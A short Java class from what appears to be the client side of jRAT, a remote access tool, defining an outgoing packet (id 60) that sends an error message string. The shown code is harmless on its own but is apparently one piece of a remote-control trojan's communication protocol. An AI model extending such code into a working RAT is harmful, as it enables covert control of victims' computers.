package jrat.client.packets.outgoing;

import jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet60Error extends AbstractOutgoingPacket {

	private String error;

	public Packet60Error(String error) {
		this.error = error;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(error);
	}

	@Override
	public short getPacketId() {
		return 60;
	}

}
